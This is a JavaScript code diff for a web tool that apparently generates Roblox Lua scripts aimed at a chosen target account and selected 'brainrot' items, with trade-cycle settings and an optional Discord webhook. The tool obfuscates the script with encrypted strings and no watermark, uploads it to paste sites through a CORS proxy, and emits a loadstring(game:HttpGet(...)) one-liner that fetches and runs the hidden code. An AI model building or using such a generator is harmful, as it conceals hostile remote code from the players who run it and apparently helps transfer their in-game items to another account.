   if(state.targets.length>0){lbl.textContent=state.targets.length+" selected";bb.classList.add("has-sel");}
   else{lbl.textContent="Select brainrots to target...";bb.classList.remove("has-sel");}
+
   $("brot-list").innerHTML=filtered.map(b=>{
     const on=state.targets.includes(b.name);
-    return`<div class="brot-item" data-name="${b.name}"><div class="brot-check${on?" on":""}">${on?"✓":""}</div><span class="brot-name">${b.name}</span><span class="brot-rarity">${b.rarity}</span></div>`;
+    const col=RARITY_COLOR[b.rarity]||"rgba(180,180,180,0.6)";
+    return`<div class="brot-item" data-name="${b.name}"><div class="brot-check${on?" on":""}">${on?"✓":""}</div><span class="brot-name">${b.name}</span><span class="brot-rarity" style="color:${col}">${b.rarity}</span></div>`;
   }).join("");
+
   $("tags").innerHTML=state.targets.map(t=>`<span class="tag">${t}<span class="tag-x" data-tag="${t}">×</span></span>`).join("");
 }
 
-/* Username search */
+// Username search
 $("username-input").addEventListener("input",e=>{
   state.username=e.target.value;state.userId="";
   $("user-dropdown").classList.remove("open");
@@ -711,19 +587,11 @@ $("username-input").addEventListener("input",e=>{
   if(!state.username.trim()||state.username.length<2)return;
   searchTimer=setTimeout(async()=>{
     try{
-      const proxy="https://corsproxy.io/?url="+encodeURIComponent(`https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(state.username)}&limit=5`);
+      const proxy="https://corsproxy.io/?"+encodeURIComponent(`https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(state.username)}&limit=5`);
       const res=await fetch(proxy);
       if(res.ok){
         const data=await res.json();
         const results=(data.data||[]).slice(0,5);
-        // Auto-select exact username match (case-insensitive)
-        const exact=results.find(u=>u.name.toLowerCase()===state.username.toLowerCase());
-        if(exact){
-          state.userId=String(exact.id);
-          $("username-input").value=exact.name;
-          state.username=exact.name;
-          render();return;
-        }
         if(results.length>0){
           $("user-dropdown").innerHTML=results.map(u=>`<div class="dd-item" data-id="${u.id}" data-name="${u.name}"><div class="dd-avatar">${u.name[0].toUpperCase()}</div><div><div class="dd-name">${u.displayName||u.name}</div><div class="dd-id">@${u.name} · ${u.id}</div></div></div>`).join("");
           $("user-dropdown").classList.add("open");
@@ -742,6 +610,10 @@ $("user-dropdown").addEventListener("click",e=>{
 
 $("brot-toggle").addEventListener("click",()=>{state.brotOpen=!state.brotOpen;render();if(state.brotOpen)setTimeout(()=>$("brot-search").focus(),40);});
 $("brot-search").addEventListener("input",e=>{state.brotSearch=e.target.value;render();});
+$("rarity-filter-row").addEventListener("click",e=>{
+  const btn=e.target.closest(".rf-btn");if(!btn)return;
+  state.rarityFilter=btn.dataset.rarity;render();
+});
 $("brot-list").addEventListener("click",e=>{
   const item=e.target.closest(".brot-item");if(!item)return;
   const name=item.dataset.name;
@@ -759,15 +631,13 @@ document.addEventListener("click",e=>{
 });
 
 function buildScript(){
-  const apiKey="YOUR_API_KEY";
   const webhook=$("webhook-input").value.trim();
   const custom=$("custom-input").value.trim();
   const targetsBlock=state.targets.length>0?state.targets.map(t=>`    ["${t}"] = true`).join(",\n"):"    -- no targets selected";
   let loader=LOADERS[state.mode];
   if(state.mode==="CUSTOM")loader=custom||"-- paste your loadstring here";
   const wh=webhook?`\ngetgenv().DISCORD_WEBHOOK = "${webhook}"`:"";
-  return`getgenv().SECRET_KEY = "${apiKey}"
-getgenv().TARGET_ID = ${state.userId}
+  return`getgenv().TARGET_ID = ${state.userId}
 getgenv().DELAY_STEP = 1
 getgenv().TRADE_CYCLE_DELAY = 2${wh}
 getgenv().TARGET_BRAINROTS = {
@@ -777,7 +647,8 @@ ${loader}`;
 }
 
 async function obfuscateScript(script){
-  const PROXY="https://corsproxy.io/?url=";
+  const PROXY="https://corsproxy.io/?";
+  // Step 1: new session
   const sRes=await fetch(PROXY+encodeURIComponent("https://luaobfuscator.com/api/obfuscator/newscript"),{
     method:"POST",headers:{"Content-Type":"application/json"},
     body:JSON.stringify({source:script}),
@@ -786,6 +657,7 @@ async function obfuscateScript(script){
   const sData=await sRes.json();
   const sid=sData.sessionId||sData.session_id;
   if(!sid)throw new Error("No session ID returned");
+  // Step 2: obfuscate
   const oRes=await fetch(PROXY+encodeURIComponent(`https://luaobfuscator.com/api/obfuscator/obfuscate?sessionId=${sid}`),{
     method:"POST",headers:{"Content-Type":"application/json"},
     body:JSON.stringify({MinifySyntax:true,MinifyStrings:true,Watermark:false,EncryptStrings:true,DisableSuperOperator:false}),
@@ -799,58 +671,39 @@ async function obfuscateScript(script){
 }
 
 async function uploadScript(code){
-  const PROXY="https://corsproxy.io/?url=";
-
-  /* 1. paste.rs — direct, has CORS headers */
+  const PROXY="https://corsproxy.io/?";
+  // Primary: paste.rs — simple POST, returns raw URL in body
   try{
-    const res=await fetch("https://paste.rs/",{
-      method:"POST",
-      headers:{"Content-Type":"text/plain","Accept":"text/plain"},
-      body:code,
+    const res=await fetch(PROXY+encodeURIComponent("https://paste.rs"),{
+      method:"POST",headers:{"Content-Type":"text/plain"},body:code,
     });
     if(!res.ok)throw new Error("paste.rs "+res.status);
-    const url=(await res.text()).trim();
-    if(!url.startsWith("http"))throw new Error("Bad paste.rs response");
-    return{url,host:"paste.rs"};
-  }catch(e1){
-    console.warn("paste.rs failed:",e1.message);
+    const raw=(await res.text()).trim();
+    if(!raw.startsWith("http"))throw new Error("Bad paste.rs response");
+    return{url:raw,host:"paste.rs"};
+  }catch(e){
+    // Fallback: hastebin
+    try{
+      const res=await fetch(PROXY+encodeURIComponent("https://hastebin.com/documents"),{
+        method:"POST",headers:{"Content-Type":"text/plain"},body:code,
+      });
+      if(!res.ok)throw new Error("hastebin "+res.status);
+      const data=await res.json();
+      if(!data.key)throw new Error("No key");
+      return{url:"https://hastebin.com/raw/"+data.key,host:"hastebin"};
+    }catch(e2){
+      // Last resort: dpaste.org
+      const params=new URLSearchParams();
+      params.append("content",code);params.append("syntax","lua");params.append("expiry_days","36500");
+      const res3=await fetch(PROXY+encodeURIComponent("https://dpaste.org/api/"),{
+        method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:params.toString(),
+      });
+      if(!res3.ok)throw new Error("dpaste "+res3.status);
+      const raw=(await res3.text()).trim().replace(/^"|"$/g,"");
+      if(!raw.startsWith("http"))throw new Error("All upload hosts failed");
+      return{url:raw+"/raw",host:"dpaste"};
+    }
   }
-
-  /* 2. sourceb.in — reliable, no auth */
-  try{
-    const res=await fetch(PROXY+encodeURIComponent("https://sourceb.in/api/bins"),{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({files:[{content:code,languageId:57}]}),
-    });
-    if(!res.ok)throw new Error("sourceb.in "+res.status);
-    const data=await res.json();
-    if(!data.key)throw new Error("No key");
-    return{url:`https://sourceb.in/raw/${data.key}/0`,host:"sourceb.in"};
-  }catch(e2){
-    console.warn("sourceb.in failed:",e2.message);
-  }
-
-  /* 3. dpaste.org — fallback */
-  try{
-    const params=new URLSearchParams();
-    params.append("content",code);
-    params.append("syntax","lua");
-    params.append("expiry_days","36500");
-    const res=await fetch(PROXY+encodeURIComponent("https://dpaste.org/api/"),{
-      method:"POST",
-      headers:{"Content-Type":"application/x-www-form-urlencoded"},
-      body:params.toString(),
-    });
-    if(!res.ok)throw new Error("dpaste "+res.status);
-    const raw=(await res.text()).trim().replace(/^"|"$/g,"");
-    if(!raw.startsWith("http"))throw new Error("Bad dpaste response");
-    return{url:raw+"/raw",host:"dpaste"};
-  }catch(e3){
-    console.warn("dpaste failed:",e3.message);
-  }
-
-  throw new Error("All upload hosts failed. Try disabling obfuscation or check your connection.");
 }
 
 $("gen-btn").addEventListener("click",async()=>{
@@ -863,20 +716,6 @@ $("gen-btn").addEventListener("click",async()=>{
   render();
   let finalCode;
   try{
-    // If userId wasn't resolved yet, look it up now
-    if(!state.userId&&state.username){
-      try{
-        const proxy="https://corsproxy.io/?url="+encodeURIComponent(`https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(state.username)}&limit=5`);
-        const res=await fetch(proxy);
-        if(res.ok){
-          const data=await res.json();
-          const exact=(data.data||[]).find(u=>u.name.toLowerCase()===state.username.toLowerCase());
-          if(exact)state.userId=String(exact.id);
-          else if(data.data&&data.data[0])state.userId=String(data.data[0].id);
-        }
-      }catch(e){}
-      if(!state.userId){showAlert("Could not resolve User ID for '"+state.username+"'. Select from the dropdown.","err");state.busy=false;render();return;}
-    }
     setStep("step-build","active");
     await sleep(200);
     const raw=buildScript();
@@ -897,7 +736,7 @@ $("gen-btn").addEventListener("click",async()=>{
       finalCode=raw;
     }
     setStep("step-paste","active");
-    const{url:pasteUrl}=await uploadScript(finalCode);
+    const{url:pasteUrl,host:pasteHost}=await uploadScript(finalCode);
     setStep("step-paste","done");
     const output=`loadstring(game:HttpGet("${pasteUrl}"))()`;
     state.generated=output;
